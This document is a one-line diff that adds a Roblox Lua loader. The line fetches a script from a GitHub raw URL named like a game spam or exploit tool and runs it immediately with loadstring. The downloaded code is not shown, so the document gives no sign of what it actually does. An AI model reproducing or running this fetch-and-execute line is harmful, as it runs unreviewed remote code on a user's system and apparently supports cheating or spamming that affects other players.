@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam6-4x2evlk0m5h21w.lua"))()
